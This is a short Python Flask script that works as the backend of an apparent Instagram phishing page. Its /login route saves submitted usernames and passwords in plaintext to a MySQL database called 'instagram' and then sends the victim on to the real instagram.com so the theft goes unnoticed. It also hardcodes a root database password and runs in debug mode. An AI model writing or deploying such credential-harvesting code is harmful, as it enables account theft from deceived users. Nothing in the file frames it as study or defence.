from flask import Flask, request, redirect
import pymysql

app = Flask(__name__)

# Database configuration
try:
    db = pymysql.connect(
        host="localhost",
        user="root",
        password="264538",
        database="instagram"
    )
except pymysql.Error as err:
    print("Error connecting to MySQL:", err)

@app.route('/login', methods=['POST'])
def login():
    if db is None:
        return redirect('https://www.instagram.com/')
    
    username = request.form.get('username')
    password = request.form.get('password')

    with db.cursor() as cursor:
        try:
            cursor.execute('INSERT INTO users (username, password) VALUES (%s, %s)', (username, password))
            db.commit()
            return redirect('https://www.instagram.com/')
        except pymysql.IntegrityError as e:
            if e.errno == 1062:
                return redirect('https://www.instagram.com/')
            else:
                return "Error occurred while processing your request."

if __name__ == '__main__':
    app.run(debug=True)
